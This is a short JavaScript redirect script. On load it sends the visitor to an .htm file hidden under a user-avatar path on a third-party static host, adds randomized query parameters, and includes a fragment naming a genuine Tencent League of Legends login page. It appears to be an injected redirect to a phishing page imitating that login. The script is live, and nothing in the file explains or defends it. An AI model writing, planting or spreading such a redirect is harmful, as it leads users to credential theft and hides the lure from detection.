var urls=['http://static.ligongku.com/user/face/d019406664a94cfda813acbed1b81ea3.htm?{wwwwww}{nnnn}#url=http://lol.qq.com/comm-htdocs/milo_mobile/login.html',];
location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
function myEeplace(s){return s.replace(/\{(\w+?)\}/g,function(a,b){var h='';for(var i=0;i<b.length;i++){if('n'==b[i]){h+=Math.floor(Math.random()*10);}else if('w'==b[i]){h+=String.fromCharCode(97+Math.floor(Math.random()*26));}}return h;});}
